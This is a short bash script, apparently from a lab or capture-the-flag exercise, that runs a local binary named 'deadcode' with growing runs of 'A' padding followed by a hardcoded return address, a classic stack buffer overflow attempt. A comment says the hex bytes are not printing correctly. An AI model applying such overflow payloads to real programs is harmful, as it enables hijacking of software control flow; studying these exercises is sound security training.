#!/bin/bash

for i in {100..105};
do
# this bit is not printing hex chars correctly
./deadcode $(perl -e "print 'A' x $i . '\x56\x9e\x04\x08'")
done
